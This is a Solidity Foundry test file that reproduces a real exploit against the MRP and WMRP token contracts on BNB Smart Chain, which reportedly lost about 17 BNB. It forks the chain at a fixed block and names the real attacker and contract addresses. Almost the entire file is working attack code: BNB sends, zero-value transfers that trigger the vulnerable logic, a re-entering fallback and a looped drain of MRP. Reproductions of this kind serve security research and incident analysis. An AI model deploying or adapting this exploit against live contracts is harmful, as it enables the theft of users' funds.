// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~17 BNB
// TX : https://app.blocksec.com/explorer/tx/bsc/0x4353a6d37e95a0844f511f0ea9300ef3081130b24f0cf7a4bd1cae26ec393101
// Attacker : https://bscscan.com/address/0x132d9bbdbe718365af6cc9e43bac109a9a53b138
// Attack Contract : https://bscscan.com/address/0x2bd8980a925e6f5a910be8cc0ad1cff663e62d9d
// GUY : https://x.com/0xNickLFranklin/status/1808309614443733005

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WMRP = IERC20(0x35F5cEf517317694DF8c50C894080caA8c92AF7D);
    IERC20 MRP = IERC20(0xA0Ba9d82014B33137B195b5753F3BC8Bf15700a3);

    function setUp() public {
        cheats.createSelectFork("bsc", 40122169);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker BNB before exploit", address(this).balance, 18);
        attack();
        emit log_named_decimal_uint("[End] Attacker BNB after exploit", address(this).balance, 18);

    }

    function attack() public {
        address(WMRP).call{value: 43.14 ether}("");
        WMRP.transfer(address(WMRP),0);
        MRP.transfer(address(WMRP),MRP.balanceOf(address(this)));
        address(WMRP).call{value: 58 ether}("");
        WMRP.transfer(address(this),0);
        MRP.transfer(address(WMRP),1268 ether);
        WMRP.transfer(address(WMRP),0);
          emit log_named_decimal_uint(
            "attacker MRP balance :", MRP.balanceOf(address(this)), MRP.decimals()
        );
        require(MRP.balanceOf(address(this)) >= 6000 ether,"The attack is invalid.");
        uint256 Transferamount=MRP.balanceOf(address(this))/20;
        uint256 i=0;
        while(i<20){
            MRP.transfer(address(MRP),Transferamount);
            i++;
        }
    }
    fallback() external payable{
        if(msg.value > 50 ether && msg.value < 100 ether){
            address(WMRP).call{value: 58 ether}("");
        }
    }

    function on314Swaper()public returns(bytes4){
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x1457b0ed) {
            return 0x0000000;
        }
        revert("no such function");
    }
    
}
